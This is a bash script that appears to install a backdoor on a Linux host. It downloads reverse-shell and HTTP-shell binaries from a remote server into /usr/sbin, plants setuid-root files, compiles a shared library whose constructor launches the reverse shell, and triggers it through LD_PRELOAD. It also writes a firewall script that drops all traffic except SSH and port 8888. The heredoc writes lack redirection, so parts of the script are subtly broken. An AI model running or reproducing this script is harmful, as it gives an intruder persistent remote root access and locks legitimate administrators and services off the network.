#!/bin/bash

sudo curl http://172.31.40.6:8000/revshell --output /usr/sbin/revshell
sudo curl http://172.31.40.6:8000/httpshell --output /usr/sbin/httpshell

sudo yum install gcc -y

sudo touch /usr/sbin/fuckyou
sudo cat /usr/sbin/fuckyou << EOF
sudo iptables -F
sudo iptables -X

sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8888 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 8888 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 8888 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT
EOF
sudo chown root:root /usr/sbin/fuckyou
sudo chmod 4755 /usr/sbin/fuckyou

sudo touch /usr/sbin/revshell_so.c
sudo cat /usr/sbin/revshell_so.c << EOF
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>

uid_t getuid(void) {
    return 0;
}

__attribute__((constructor))
void init() {
    system("/usr/sbin/revshell &");
    system("/usr/sbin/fuckyou");
}
EOF
sudo gcc -shared -fPIC -o /usr/sbin/revshell_so /usr/sbin/revshell_so.c
sudo chown root:root /usr/sbin/revshell_so
sudo chmod 4755 /usr/sbin/revshell_so
LD_PRELOAD=/usr/sbin/revshell_so ls
